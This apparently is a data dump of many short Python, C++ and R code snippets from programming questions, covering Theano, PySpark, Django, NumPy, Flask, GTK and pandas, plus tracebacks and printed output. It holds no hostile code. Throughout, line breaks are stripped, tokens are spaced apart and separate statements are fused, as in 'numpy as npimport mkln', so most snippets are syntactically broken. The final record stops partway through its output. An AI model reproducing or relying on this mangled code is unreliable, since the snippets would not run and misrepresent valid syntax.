, in access_grad_cache term = access_term_cache ( node ) [ idx ] File `` /usr/local/lib/python2.7/dist-packages/theano/gradient.py '' , line 951 , in access_term_cache output_grads = [ access_grad_cache ( var ) for var in node.outputs ] File `` /usr/local/lib/python2.7/dist-packages/theano/gradient.py '' , line 1241 , in access_grad_cache term = access_term_cache ( node ) [ idx ] File `` /usr/local/lib/python2.7/dist-packages/theano/gradient.py '' , line 1089 , in access_term_cache input_grads = node.op.grad ( inputs , new_output_grads ) File `` /usr/local/lib/python2.7/dist-packages/theano/tensor/elemwise.py '' , line 662 , in grad rval = self._bgrad ( inputs , ograds ) File `` /usr/local/lib/python2.7/dist-packages/theano/tensor/elemwise.py '' , line 737 , in _bgrad scalar_igrads = self.scalar_op.grad ( scalar_inputs , scalar_ograds ) File `` /usr/local/lib/python2.7/dist-packages/theano/scalar/basic.py '' , line 878 , in grad self.__class__.__name__ ) theano.gof.utils.MethodNotDefined : ( 'grad ' , < class 'theano.tensor.nnet.sigm.UltraFastScalarSigmoid ' > , 'UltraFastScalarSigmoid ' ) Cost : 1.19810193303Cost : 0.684360309062Cost : 0.692614056124Cost : 0.697902474354Cost : 0.701540531661Cost : 0.703807604483Cost : 0.70470238116Cost : 0.7043857388310.49012606240.4862481770530.4894907850780.493368670425"
"import pyspark.sql.functions as Fnull_or_unknown_count = df.sample ( 0.01 ) .filter ( F.col ( 'env ' ) .isNull ( ) | ( F.col ( 'env ' ) == 'Unknown ' ) ) .count ( ) from unittest import mockfrom unittest.mock import ANY @ mock.patch ( 'pyspark.sql.DataFrame ' , spec=pyspark.sql.DataFrame ) def test_null_or_unknown_validation ( self , mock_df ) : mock_df.sample ( 0.01 ) .filter ( ANY ) .count.return_value = 250 File `` /usr/local/lib/python3.7/site-packages/pyspark/sql/functions.py '' , line 44 , in _ jc = getattr ( sc._jvm.functions , name ) ( col._jc if isinstance ( col , Column ) else col ) AttributeError : 'NoneType ' object has no attribute '_jvm '"
"from datetime import datetime , timedeltal = [ ] for i in range ( 100 ) : d = datetime ( 2015,11,2 ) + timedelta ( days=i ) if d > datetime ( 2015,12,14 ) : break if d.weekday ( ) == 1 or d.weekday ( ) == 2 : # tuesday or wednesday l.append ( d ) print l"
"class Tenant ( models.Model ) : name = models.CharField ( max_length=100 ) class Room ( models.Model ) : owner = models.ForeignKey ( User ) maintainer = models.ForeignKey ( User ) tenant = models.ForeignKey ( Tenant ) SELECT auth_user.id , ... FROM tenants_tenant , tenants_room , auth_userWHERE tenants_tenant.id = tenants_room.tenant_idAND tenants_room.owner_id = auth_user.id ; users = User.objects.filter ( id__in=my_tenant.rooms.values_list ( 'user ' ) ) user_ids = id__in=my_tenant.rooms.values_list ( 'user ' ) users = User.objects.filter ( id__in=list ( user_ids ) ) User.objects.all ( `` '' '' SELECT auth_user . *FROM tenants_tenant , tenants_room , auth_userWHERE tenants_tenant.id = tenants_room.tenant_idAND tenants_room.owner_id = auth_user.id '' '' '' )"
"> > > s = slice ( 0 , 10 ) > > > hash ( s ) TypeError Traceback ( most recent call last ) < ipython-input-10-bdf9773a0874 > in < module > ( ) -- -- > 1 hash ( s ) TypeError : unhashable type > > > s.start = 5TypeError Traceback ( most recent call last ) < ipython-input-11-6710992d7b6d > in < module > ( ) -- -- > 1 s.start = 5TypeError : readonly attribute class Foo : def __init__ ( self ) : self.cache = { } def __getitem__ ( self , idx ) : if idx in self.cache : return self.cache [ idx ] else : r = random.random ( ) self.cache [ idx ] = r return r class Foo : def __init__ ( self ) : self.cache = { } def __getitem__ ( self , idx ) : if isinstance ( idx , slice ) : idx = ( `` slice '' , idx.start , idx.stop , idx.step ) if idx in self.cache : return self.cache [ idx ] else : r = random.random ( ) self.cache [ idx ] = r return r"
"import numpy as npimport mkln = 10000A = np.random.randn ( n , n ) .astype ( 'float32 ' ) B = np.random.randn ( n , n ) .astype ( 'float32 ' ) C = np.zeros ( ( n , n ) ) .astype ( 'float32 ' ) mkl.set_num_threads ( 3 ) ; % time np.dot ( A , B , out=C ) 11.5 secondsmkl.set_num_threads ( 6 ) ; % time np.dot ( A , B , out=C ) 6 secondsmkl.set_num_threads ( 12 ) ; % time np.dot ( A , B , out=C ) 3 secondsmkl.set_num_threads ( 18 ) ; % time np.dot ( A , B , out=C ) 2.4 secondsmkl.set_num_threads ( 24 ) ; % time np.dot ( A , B , out=C ) 3.6 secondsmkl.set_num_threads ( 30 ) ; % time np.dot ( A , B , out=C ) 5 secondsmkl.set_num_threads ( 36 ) ; % time np.dot ( A , B , out=C ) 5.5 seconds perf stat -e task-clock , cycles , instructions , cache-references , cache-misses ./ptestf.py631,301,854 cache-misses # 31.478 % of all cache refs 93,087,703 cache-misses # 5.164 % of all cache refs /opt/intel/bin/icc -o comp_sgemm_mkl.so -openmp -mkl sgem_lib.c -lm -lirc -O3 -fPIC -shared -std=c99 -vec-report1 -xhost -I/opt/intel/composer/mkl/include # include < stdio.h > # include < stdlib.h > # include `` mkl.h '' void comp_sgemm_mkl ( int m , int n , int k , float *A , float *B , float *C ) ; void comp_sgemm_mkl ( int m , int n , int k , float *A , float *B , float *C ) { int i , j ; float alpha , beta ; alpha = 1.0 ; beta = 0.0 ; cblas_sgemm ( CblasRowMajor , CblasNoTrans , CblasNoTrans , m , n , k , alpha , A , k , B , n , beta , C , n ) ; } def comp_sgemm_mkl ( A , B , out=None ) : lib = CDLL ( omplib ) lib.cblas_sgemm_mkl.argtypes = [ c_int , c_int , c_int , np.ctypeslib.ndpointer ( dtype=np.float32 , ndim=2 ) , np.ctypeslib.ndpointer ( dtype=np.float32 , ndim=2 ) , np.ctypeslib.ndpointer ( dtype=np.float32 , ndim=2 ) ] lib.comp_sgemm_mkl.restype = c_void_p m = A.shape [ 0 ] n = B.shape [ 0 ] k = B.shape [ 1 ] if np.isfortran ( A ) : raise ValueError ( 'Fortran array ' ) if m ! = n : raise ValueError ( 'Wrong matrix dimensions ' ) if out is None : out = np.empty ( ( m , k ) , np.float32 ) lib.comp_sgemm_mkl ( m , n , k , A , B , out )"
"def est_extract ( ) : image_byte_array = est_get_bytes_containing_message ( ) header_len = 54 # CODE TO FIND THE CORRECT VALUES OF p and q # ******************************************************** message_bit_array = est_extract_bits_from_image ( image_byte_array , header_len , p , q ) message_byte_array = est_convert_bits_to_bytes ( message_bit_array ) est_write_message_text ( message_byte_array ) if __name__ == '__main__ ' : est_extract ( ) for a in range ( 1 , 4 , 1 ) : for b in range ( 1 , 4 , 1 ) : bp = a/b print ( `` p = '' , a , `` q = '' , b , `` bp = '' , `` % 6.3f '' % bp ) if ( bp > .5 and bp < 1 ) : p = a q = b print ( `` The answer is : '' , `` p = '' , p , `` q = '' , q ) p = 1 q = 1 bp = 1.000p = 1 q = 2 bp = 0.500p = 1 q = 3 bp = 0.333p = 2 q = 1 bp = 2.000p = 2 q = 2 bp = 1.000p = 2 q = 3 bp = 0.667The answer is : p = 2 q = 3p = 3 q = 1 bp = 3.000p = 3 q = 2 bp = 1.500p = 3 q = 3 bp = 1.000 p = 1 q = 1 bp = 1.000p = 1 q = 2 bp = 0.500p = 1 q = 3 bp = 0.333p = 2 q = 1 bp = 2.000p = 2 q = 2 bp = 1.000p = 2 q = 3 bp = 0.667p = 3 q = 1 bp = 3.000p = 3 q = 2 bp = 1.500p = 3 q = 3 bp = 1.000The answer is : p = 2 q = 3"
"nx.draw ( v29graph , nx.get_node_attributes ( v29graph , 'pos ' ) , edge_labels=labels2 ) nx.draw_networkx_edge_labels ( v29graph , pos=nx.get_node_attributes ( v29graph , 'pos ' ) , edge_labels=labels2 )"
"def extendList ( val , list= [ ] ) : list.append ( val ) return listlist1 = extendList ( 10 ) list2 = extendList ( 123 , [ ] ) list3 = extendList ( ' a ' ) print `` list1 = % s `` % list1print `` list2 = % s `` % list2print `` list2 = % s `` % list3 list1 = [ 10 , ' a ' ] list2 = [ 123 ] list2 = [ 10 , ' a ' ]"
"class LogoutHandler ( webapp2.RequestHandler ) : def get ( self ) : current_user = main.get_user_from_cookie ( self.request.cookies , facebookconf.FACEBOOK_APP_ID , facebookconf.FACEBOOK_APP_SECRET ) if current_user : graph = main.GraphAPI ( current_user [ `` access_token '' ] ) profile = graph.get_object ( `` me '' ) accessed_token = current_user [ `` access_token '' ] self.set_cookie ( `` fbsr_ '' + facebookconf.FACEBOOK_APP_ID , None , expires=time.time ( ) - 86400 ) self.redirect ( `` https : //www.facebook.com/logout.php ? next=http : // % s & access_token= % s '' get_host ( ) , accessed_token ) def set_cookie ( self , name , value , expires=None ) : if value is None : value = 'deleted ' expires = datetime.timedelta ( minutes=-50000 ) jar = Cookie.SimpleCookie ( ) jar [ name ] = value jar [ name ] [ 'path ' ] = '/ ' if expires : if isinstance ( expires , datetime.timedelta ) : expires = datetime.datetime.now ( ) + expires if isinstance ( expires , datetime.datetime ) : expires = expires.strftime ( ' % a , % d % b % Y % H : % M : % S ' ) jar [ name ] [ 'expires ' ] = expires self.response.headers.add_header ( *jar.output ( ) .split ( ' : ' , 1 ) ) def get_host ( self ) : return os.environ.get ( 'HTTP_HOST ' , os.environ [ 'SERVER_NAME ' ] ) def get ( self ) : fbuser=None profile = None access_token = None accessed_token = None logout = False if self.request.get ( 'code ' ) : args = dict ( code = self.request.get ( 'code ' ) , client_id = facebookconf.FACEBOOK_APP_ID , client_secret = facebookconf.FACEBOOK_APP_SECRET , redirect_uri = 'self.get_host ( ) / ' , ) file = urllib.urlopen ( `` https : //graph.facebook.com/oauth/access_token ? '' + urllib.urlencode ( args ) ) try : token_response = file.read ( ) finally : file.close ( ) access_token = cgi.parse_qs ( token_response ) [ `` access_token '' ] [ -1 ] graph = main.GraphAPI ( access_token ) user = graph.get_object ( `` me '' ) # write the access_token to the datastore fbuser = main.FBUser.get_by_key_name ( user [ `` id '' ] ) logging.debug ( `` fbuser `` +fbuser.name ) if not fbuser : fbuser = main.FBUser ( key_name=str ( user [ `` id '' ] ) , id=str ( user [ `` id '' ] ) , name=user [ `` name '' ] , profile_url=user [ `` link '' ] , access_token=access_token ) fbuser.put ( ) elif fbuser.access_token ! = access_token : fbuser.access_token = access_token fbuser.put ( ) current_user = main.get_user_from_cookie ( self.request.cookies , facebookconf.FACEBOOK_APP_ID , facebookconf.FACEBOOK_APP_SECRET ) if current_user : graph = main.GraphAPI ( current_user [ `` access_token '' ] ) profile = graph.get_object ( `` me '' ) accessed_token = current_user [ `` access_token '' ] class FBUser ( db.Model ) : id = db.StringProperty ( required=True ) created = db.DateTimeProperty ( auto_now_add=True ) updated = db.DateTimeProperty ( auto_now=True ) name = db.StringProperty ( required=True ) profile_url = db.StringProperty ( ) access_token = db.StringProperty ( required=True ) name = db.StringProperty ( required=True ) picture = db.StringProperty ( ) email = db.StringProperty ( )"
"print ( 'Hello World ' , end= '' ) sys.stdout.write ( 'Hello World ' ) os.write ( 1 , b'Hello World ' )"
"with open ( filename , `` r '' , newline='\r\n ' ) as f :"
"def comb ( input , lst = [ ] , lset = set ( ) ) : if lst : yield lst for i , el in enumerate ( input ) : if lset.isdisjoint ( el ) : for out in comb ( input [ i+1 : ] , lst + [ el ] , lset | set ( el ) ) : yield outfor c in comb ( [ [ 1 , 2 , 3 ] , [ 3 , 6 , 8 ] , [ 4 , 9 ] , [ 6 , 11 ] ] ) : print c for out in comb ( ... ) : yield out"
"df1 : side_a side_b a b b c c d k l l m l n p q q r r sdf2 : side_a end_point a c b c c c k m k n l m l n p s q s r s side_a end_point a [ b , c ] b [ c ] c [ c ] k [ l , m ] k [ l , n ] l [ m ] l [ n ] p [ q , r , s ] q [ r , s ] r [ s ] import pandas as pdimport numpy as npimport itertoolsdef get_child_list ( df , parent_id ) : list_of_children = [ ] list_of_children.append ( df [ df [ 'side_a ' ] == parent_id ] [ 'side_b ' ] .values ) for c_ , r_ in df [ df [ 'side_a ' ] == parent_id ] .iterrows ( ) : if r_ [ 'side_b ' ] ! = parent_id : list_of_children.append ( get_child_list ( df , r_ [ 'side_b ' ] ) ) # to flatten the list list_of_children = [ item for sublist in list_of_children for item in sublist ] return list_of_childrennew_df = pd.DataFrame ( columns= [ 'side_a ' , 'list_of_children ' ] ) for index , row in df1.iterrows ( ) : temp_df = pd.DataFrame ( columns= [ 'side_a ' , 'list_of_children ' ] ) temp_df [ 'list_of_children ' ] = pd.Series ( get_child_list ( df1 , row [ 'side_a ' ] ) ) temp_df [ 'side_a ' ] = row [ 'side_a ' ] new_df = new_df.append ( temp_df )"
typedef boost : :u32regex tRegex ; tRegex emptyre = boost : :make_u32regex ( `` ^ $ '' ) ; tRegex commentre = boost : :make_u32regex ( `` ^ ; . * $ '' ) ; tRegex versionre = boost : :make_u32regex ( `` ^ @ \\ $ Date : ( . * ) \\ $ $ '' ) ; tRegex includere = boost : :make_u32regex ( `` ^ < ( \\S+ ) $ '' ) ; tRegex rungroupre = boost : :make_u32regex ( `` ^ > ( \\d+ ) $ '' ) ; tRegex readreppre = boost : :make_u32regex ( `` ^ > ( \\S+ ) $ '' ) ; tRegex tokre = boost : :make_u32regex ( `` ^ : ( . * ) $ '' ) ; tRegex groupstartre = boost : :make_u32regex ( `` ^ # ( \\d+ ) $ '' ) ; tRegex groupendre = boost : :make_u32regex ( `` ^ # $ '' ) ; tRegex rulere = boost : :make_u32regex ( `` ^ ( [ ! -+^ ] ) ( [ ^\\t ] + ) \\t+ ( [ ^\\t ] * ) $ '' ) ;
"class Staff ( ) : def __init__ ( self ) : self.modes= { 'menu ' : True , 'spawning ' : False , 'sprite_change ' : False } self.timer=pygame.time.Clock ( ) self.tick_count=0 def main_loop ( ) : staff=Staff ( ) while not done : update_positions ( staff ) clear_background ( staff ) draw_sprites ( staff )"
"from __future__ import division , print_function"
"estimator = tf.estimator.LinearClassifier ( feature_columns=feature_cols , config=my_checkpointing_config , model_dir=output_dir , optimizer=lambda : tf.train.FtrlOptimizer ( learning_rate=tf.train.exponential_decay ( learning_rate=0.1 , global_step=tf.train.get_or_create_global_step ( ) , decay_steps=1000 , decay_rate=0.96 ) ) )"
for number in streaks_0 : if number == 0 : streak_0_num0s += 1 elif number ! = 0 : streak_0_sum += numberstreak_0_average = ( streak_0_sum / ( len ( streaks_0 ) - streak_0_num0s ) ) for number in streaks_1 : if number == 0 : streak_1_num0s += 1 elif number ! = 0 : streak_1_sum += numberstreak_1_average = ( streak_1_sum / ( len ( streaks_1 ) - streak_1_num0s ) ) for number in streaks_2 : if number == 0 : streak_2_num0s += 1 elif number ! = 0 : streak_2_sum += numberstreak_2_average = ( streak_2_sum / ( len ( streaks_2 ) - streak_2_num0s ) )
"├── blog ├── manage.py └── blog ├── __init__.py ├── config.py └── routes.py # ! /usr/bin/env pythonfrom flask.ext.script import Managermanager = Manager ( create_app ) # < manager commands > # ... # ... manager.add_option ( '-c ' , ' -- config ' , dest='config ' , required=False ) manager.run ( ) from flask import flaskfrom .config import Defaultdef create_app ( config=None ) : app = Flask ( __name__ ) app.config.from_object ( Default ) if config is not None : app.config.from_pyfile ( config ) return app @ app.route ( ) # < -- erm , this wo n't work now ! ? def index ( ) : return `` Hello ''"
"[ [ 'Andrew ' , ' 1 ' , ' 9 ' ] , [ 'Peter ' , ' 1 ' , '10 ' ] , [ 'Andrew ' , ' 1 ' , ' 8 ' ] , [ 'Peter ' , ' 1 ' , '11 ' ] , [ 'Sam ' , ' 4 ' , ' 9 ' ] , [ 'Andrew ' , ' 2 ' , ' 2 ' ] ] [ [ 'Andrew ' , ' 1 ' , '17 ' ] , [ 'Peter ' , ' 1 ' , '21 ' ] , [ 'Sam ' , ' 4 ' , ' 9 ' ] , [ 'Andrew ' , ' 2 ' , ' 2 ' ] ]"
"import abcimport collectionsclass A ( object ) : __metaclass__ = abc.ABCMeta @ abc.abstractmethod def do ( self ) : print ( `` U Ca n't Touch This '' ) B = collections.namedtuple ( ' B ' , ' x , y ' ) class C ( B , A ) : passc = C ( x=3 , y=4 ) print ( c ) c.do ( ) B ( x=3 , y=4 ) U Ca n't Touch This"
hp.myfunc ( 1 ) import healpy as hp
"import apt from apt.progress.base import InstallProgress class InstallStatusUpdate ( InstallProgress ) : def conffile ( self , current , new ) : print `` conffile prompt : % s % s '' % ( current , new ) def processing ( self , pkg , stage ) : print `` Processing `` , pkg , `` stage : `` , stage def error ( self , pkg , errormsg ) : print `` Package `` , pkg , `` error : `` , errormsg def finish_update ( self ) : print `` Installation is complete '' def status_change ( self , pkg , percent , status ) : print `` Package : `` , pkg , `` at `` , percent , `` - > `` , status def dpkg_status_change ( self , pkg , status ) : print `` Package `` , pkg , `` , Status : `` , status def install_updates ( self , pkg_list ) : fprogress = apt.progress.TextFetchProgress ( ) iprogress = InstallStatusUpdate ( ) cache_tmp = apt.Cache ( ) cache_tmp.update ( ) cache_tmp.open ( None ) for pkg in pkg_list : try : self.pkgname = cache_tmp [ pkg.name ] if self.pkgname.is_installed and self.pkgname.is_upgradable : self.pkgname.mark_upgrade ( ) else : self.pkgname.mark_install ( ) except Exception as e : print e.message result = self.pkgname.commit ( fprogress , iprogress ) # Maybe i 'm doing something wrong here but result always = None ..."
"`` ` { r setup , include=FALSE } knitr : :opts_chunk $ set ( echo = TRUE , message = FALSE , warning = FALSE ) `` `` `` { r } library ( plotly ) subplot ( plot_ly ( mpg , x = ~cty , y = ~hwy , name = 'default ' ) , plot_ly ( mpg , x = ~cty , y = ~hwy ) % > % add_markers ( alpha = 0.2 , name = 'alpha ' ) , plot_ly ( mpg , x = ~cty , y = ~hwy ) % > % add_markers ( symbols = I ( 1 ) , name = 'hollow ' ) ) `` `` `` { python } import plotlyimport plotly.plotly as pyimport plotly.graph_objs as goimport numpy as npplotly.tools.set_credentials_file ( username='xxx ' , api_key='xxx ' ) N = 500trace0 = go.Scatter ( x = np.random.randn ( N ) , y = np.random.randn ( N ) + 2 , name = `` Above '' , mode = `` markers '' , marker = dict ( size = 10 , color = `` rgba ( 152 , 0 , 0 , .8 ) '' , line = dict ( width = 2 , color = `` rgb ( 0,0,0 ) '' ) ) ) trace1 = go.Scatter ( x = np.random.randn ( N ) , y = np.random.randn ( N ) - 2 , name = `` below '' , mode = `` markers '' , marker = dict ( size = 10 , color = `` rgba ( 255 , 182 , 193 , .9 ) '' , line = dict ( width = 2 , color = `` rgb ( 0,0,0 ) '' ) ) ) data = [ trace0 , trace1 ] layout = dict ( title = `` Styled Scatter '' , yaxis = dict ( zeroline = False ) , xaxis = dict ( zeroline=False ) ) fig = dict ( data = data , layout = layout ) py.iplot ( fig , filename = `` styled-scatter '' ) `` `"
"# Generic node classclass Node ( ABC ) : @ abstractmethod def to_expr ( self ) : pass @ staticmethod def bracket_complex ( child ) : s = child.to_expr ( ) return s if isinstance ( child , Leaf ) or isinstance ( child , UnaryOpNode ) else `` ( `` + s + `` ) '' # Leaf class - used for values and variablesclass Leaf ( Node ) : def __init__ ( self , val ) : self.val = val def to_expr ( self ) : return str ( self.val ) # Unary operator nodeclass UnaryOpNode ( Node ) : def __init__ ( self , op , child ) : self.op = op self.child = child def to_expr ( self ) : return str ( self.op ) + super ( ) .bracket_complex ( self.child ) # Binary operator nodeclass BinaryOpNode ( Node ) : def __init__ ( self , op , lchild , rchild ) : self.op = op self.lchild = lchild self.rchild = rchild def to_expr ( self ) : return super ( ) .bracket_complex ( self.lchild ) + `` `` + str ( self.op ) + `` `` + super ( ) .bracket_complex ( self.rchild ) # Variadic operator node ( arbitrary number of arguments ) # Assumes commutative operatorclass VariadicOpNode ( Node ) : def __init__ ( self , op , list_ ) : self.op = op self.children = list_ def to_expr ( self ) : return ( `` `` + str ( self.op ) + `` `` ) .join ( super ( ) .bracket_complex ( child ) for child in self.children ) TypeError : super ( type , obj ) : obj must be an instance or subtype of type"
"import matplotlib.pyplot as pltimport numpy as npimport matplotlib.tickert = np.arange ( 0.0 , 100.0 , 0.1 ) s = np.sin ( 0.1*np.pi*t ) *np.exp ( -t*0.01 ) fig , ax = plt.subplots ( ) plt.plot ( t , s ) ax1 = ax.twiny ( ) ax1.plot ( t , s ) ax1.xaxis.set_ticks_position ( 'bottom ' ) majors = np.linspace ( 0 , 100 , 6 ) minors = np.linspace ( 0 , 100 , 11 ) thirds = np.linspace ( 0 , 100 , 101 ) ax.xaxis.set_major_locator ( matplotlib.ticker.FixedLocator ( majors ) ) ax.xaxis.set_minor_locator ( matplotlib.ticker.FixedLocator ( minors ) ) ax1.xaxis.set_major_locator ( matplotlib.ticker.FixedLocator ( [ ] ) ) ax1.xaxis.set_minor_locator ( matplotlib.ticker.FixedLocator ( thirds ) ) ax1.tick_params ( which='minor ' , length=2 ) ax.tick_params ( which='minor ' , length=4 ) ax.tick_params ( which='major ' , length=6 ) ax.grid ( which='both ' , axis= ' x ' , linestyle= ' -- ' ) plt.axhline ( color='gray ' ) plt.show ( )"
"{ 'moduleName ' : 'some_module ' , 'funcName ' : 'someFunction ' , 'localVars ' : { 'someVar ' : someVal , ... } , 'globalVars ' : { 'someOtherVar ' : someOtherVal , ... } , 'modulePath ' : '/a/path/to/a/directory ' , 'customPathHasPriority ' : aBoolean , 'args ' : ( arg1 , arg2 , ... ) , 'kwargs ' : { 'kw1 ' : val1 , 'kw2 ' : val2 , ... } } sys.path.append ( modulePath ) globals ( ) [ moduleName ] =__import__ ( moduleName , localVars , globalVars ) returnVal = globals ( ) [ moduleName ] .__dict__ [ funcName ] ( *args , **kwargs )"
db = DAL ( 'mysql : //user1 : P @ sswd @ localhost/test ' ) db = DAL ( 'mysql : //user1 : P % 40sswd @ localhost/test ' )
from PySide.QtCore import * @ Slot ( int ) def say ( i ) : print `` Say % i '' % iclass Communicate ( QObject ) : speak = Signal ( int ) someone = Communicate ( ) someone.speak.connect ( say ) someone.speak.emit ( 0x7FFFFFFF ) # works finesomeone.speak.emit ( 0x80000000 ) # OverflowError after slot `` say '' runssay ( 0x80000000 ) # works fine Say 2147483647Say -2147483648OverflowErrorSay 2147483648
"from gi.repository import Gtk # ... toolbar = Gtk.Toolbar ( ) toolbar.get_style_context ( ) .add_class ( Gtk.STYLE_CLASS_PRIMARY_TOOLBAR ) # ... self.fileOpen = Gtk.ToolButton.new_from_stock ( Gtk.STOCK_OPEN ) self.fileOpen.connect ( `` clicked '' , self.on_FileOpenStandard_activate ) toolbar.insert ( self.fileOpen , -1 ) self.fileOpen = Gtk.ToolButton ( Gtk.Image.new_from_icon_name ( `` document-open '' , Gtk.IconSize.LARGE_TOOLBAR ) , `` Open '' ) self.fileOpen.connect ( `` clicked '' , self.on_FileOpenStandard_activate ) toolbar.insert ( self.fileOpen , -1 )"
"In [ 29 ] : re.findall ( `` ( [ abc ] ) + '' , '' abc '' ) Out [ 29 ] : [ ' c ' ] In [ 30 ] : re.findall ( `` [ abc ] + '' , '' abc '' ) Out [ 30 ] : [ 'abc ' ]"
"StrList1 = [ 'd+ % 7B % 0A++++public+ ' , 'public+static+v ' , 'program % 0Apublic+ ' , 'ublic+class+Hel ' , 'lass+HelloWorld ' , 'elloWorld+ % 7B % 0A+++ ' , ' % 2F % 2F+Sample+progr ' , 'program % 0Apublic+ ' ] output = [ 'ublic+class+HelloWorld+ % 7B % 0A++++public+ ' , ' % 2F % 2F+Sample+program % 0Apublic+static+v ` ] output = [ ' % 2F % 2F+Sample+program % 0Apublic+class+HelloWorld+ % 7B % 0A++++public+static+v ' ]"
"import numpy as npclass new_array ( np.ndarray ) : def __new__ ( cls , array , foo ) : obj = array.view ( cls ) obj.foo = foo return obj def __array_finalize__ ( self , obj ) : print `` __array_finalize '' if obj is None : return self.foo = getattr ( obj , 'foo ' , None ) def __getitem__ ( self , key ) : print `` __getitem__ '' print `` key is % s '' % repr ( key ) print `` self.foo is % d , self.view ( np.ndarray ) is % s '' % ( self.foo , repr ( self.view ( np.ndarray ) ) ) self.foo += 1 return super ( new_array , self ) .__getitem__ ( key ) print `` Block 1 '' print `` Object construction calls '' base_array = np.arange ( 20 ) .reshape ( 4,5 ) print `` base_array is % s '' % repr ( base_array ) p = new_array ( base_array , 0 ) print `` \n\n '' print `` Block 2 '' print `` Call sequence for p [ -1 : ] is : '' p [ -1 : ] print `` p [ -1 ] .foo is % d\n\n '' % p.fooprint `` Block 3 '' print `` Call sequence for s = p [ -1 : ] is : '' s = p [ -1 : ] print `` p [ -1 ] .foo is now % d '' % p.fooprint `` s.foo is now % d '' % s.fooprint `` s.foo + p.foo = % d\n\n '' % ( s.foo + p.foo ) print `` Block 4 '' print `` Doing q = s + s '' q = s + sprint `` q.foo = % d\n\n '' % q.fooprint `` Block 5 '' print `` Printing s '' print repr ( s ) print `` p.foo is now % d '' % p.fooprint `` s.foo is now % d\n\n '' % s.fooprint `` Block 6 '' print `` Printing q '' print repr ( q ) print `` p.foo is now % d '' % p.fooprint `` s.foo is now % d '' % s.fooprint `` q.foo is now % d\n\n '' % q.fooprint `` Block 7 '' print `` Call sequence for p [ -1 ] '' a = p [ -1 ] print `` p [ -1 ] .foo is % d\n\n '' % a.fooprint `` Block 8 '' print `` Call sequence for p [ slice ( -1 , None , None ) ] is : '' a = p [ slice ( -1 , None , None ) ] print `` p [ slice ( None , -1 , None ) ] .foo is % d '' % a.fooprint `` p.foo is % d '' % p.fooprint `` s.foo + p.foo = % d\n\n '' % ( s.foo + p.foo ) Block 1Object construction callsbase_array is array ( [ [ 0 , 1 , 2 , 3 , 4 ] , [ 5 , 6 , 7 , 8 , 9 ] , [ 10 , 11 , 12 , 13 , 14 ] , [ 15 , 16 , 17 , 18 , 19 ] ] ) __array_finalizeBlock 2Call sequence for p [ -1 : ] is : __array_finalizep [ -1 ] .foo is 0Block 3Call sequence for s = p [ -1 : ] is : __array_finalizep [ -1 ] .foo is now 0s.foo is now 0s.foo + p.foo = 0Block 4Doing q = s + s__array_finalizeq.foo = 0Block 5Printing s__getitem__key is -1self.foo is 0 , self.view ( np.ndarray ) is array ( [ [ 15 , 16 , 17 , 18 , 19 ] ] ) __array_finalize__getitem__key is -5self.foo is 1 , self.view ( np.ndarray ) is array ( [ 15 , 16 , 17 , 18 , 19 ] ) __getitem__key is -4self.foo is 2 , self.view ( np.ndarray ) is array ( [ 15 , 16 , 17 , 18 , 19 ] ) __getitem__key is -3self.foo is 3 , self.view ( np.ndarray ) is array ( [ 15 , 16 , 17 , 18 , 19 ] ) __getitem__key is -2self.foo is 4 , self.view ( np.ndarray ) is array ( [ 15 , 16 , 17 , 18 , 19 ] ) __getitem__key is -1self.foo is 5 , self.view ( np.ndarray ) is array ( [ 15 , 16 , 17 , 18 , 19 ] ) new_array ( [ [ 15 , 16 , 17 , 18 , 19 ] ] ) p.foo is now 0s.foo is now 1Block 6Printing q__getitem__key is -1self.foo is 0 , self.view ( np.ndarray ) is array ( [ [ 30 , 32 , 34 , 36 , 38 ] ] ) __array_finalize__getitem__key is -5self.foo is 1 , self.view ( np.ndarray ) is array ( [ 30 , 32 , 34 , 36 , 38 ] ) __getitem__key is -4self.foo is 2 , self.view ( np.ndarray ) is array ( [ 30 , 32 , 34 , 36 , 38 ] ) __getitem__key is -3self.foo is 3 , self.view ( np.ndarray ) is array ( [ 30 , 32 , 34 , 36 , 38 ] ) __getitem__key is -2self.foo is 4 , self.view ( np.ndarray ) is array ( [ 30 , 32 , 34 , 36 , 38 ] ) __getitem__key is -1self.foo is 5 , self.view ( np.ndarray ) is array ( [ 30 , 32 , 34 , 36 , 38 ] ) new_array ( [ [ 30 , 32 , 34 , 36 , 38 ] ] ) p.foo is now 0s.foo is now 1q.foo is now 1Block 7Call sequence for p [ -1 ] __getitem__key is -1self.foo is 0 , self.view ( np.ndarray ) is array ( [ [ 0 , 1 , 2 , 3 , 4 ] , [ 5 , 6 , 7 , 8 , 9 ] , [ 10 , 11 , 12 , 13 , 14 ] , [ 15 , 16 , 17 , 18 , 19 ] ] ) __array_finalizep [ -1 ] .foo is 1Block 8Call sequence for p [ slice ( -1 , None , None ) ] is : __getitem__key is slice ( -1 , None , None ) self.foo is 1 , self.view ( np.ndarray ) is array ( [ [ 0 , 1 , 2 , 3 , 4 ] , [ 5 , 6 , 7 , 8 , 9 ] , [ 10 , 11 , 12 , 13 , 14 ] , [ 15 , 16 , 17 , 18 , 19 ] ] ) __array_finalizep [ slice ( None , -1 , None ) ] .foo is 2p.foo is 2s.foo + p.foo = 3 Block 5Printing s__getitem__key is -1self.foo is 0 , self.view ( np.ndarray ) is array ( [ [ 15 , 16 , 17 , 18 , 19 ] ] ) __array_finalize____getitem__key is -5self.foo is 1 , self.view ( np.ndarray ) is array ( [ 15 , 16 , 17 , 18 , 19 ] ) __array_finalize____array_finalize____array_finalize____getitem__key is -4self.foo is 2 , self.view ( np.ndarray ) is array ( [ 15 , 16 , 17 , 18 , 19 ] ) __array_finalize____array_finalize____array_finalize____getitem__key is -3self.foo is 3 , self.view ( np.ndarray ) is array ( [ 15 , 16 , 17 , 18 , 19 ] ) __array_finalize____array_finalize____array_finalize____getitem__key is -2self.foo is 4 , self.view ( np.ndarray ) is array ( [ 15 , 16 , 17 , 18 , 19 ] ) __array_finalize____array_finalize____array_finalize____getitem__key is -1self.foo is 5 , self.view ( np.ndarray ) is array ( [ 15 , 16 , 17 , 18 , 19 ] ) __array_finalize____array_finalize____array_finalize__new_array ( [ [ 15 , 16 , 17 , 18 , 19 ] ] ) p.foo is now 0s.foo is now 1Block 6Printing q__getitem__key is -1self.foo is 0 , self.view ( np.ndarray ) is array ( [ [ 30 , 32 , 34 , 36 , 38 ] ] ) __array_finalize____getitem__key is -5self.foo is 1 , self.view ( np.ndarray ) is array ( [ 30 , 32 , 34 , 36 , 38 ] ) __array_finalize____array_finalize____array_finalize____getitem__key is -4self.foo is 2 , self.view ( np.ndarray ) is array ( [ 30 , 32 , 34 , 36 , 38 ] ) __array_finalize____array_finalize____array_finalize____getitem__key is 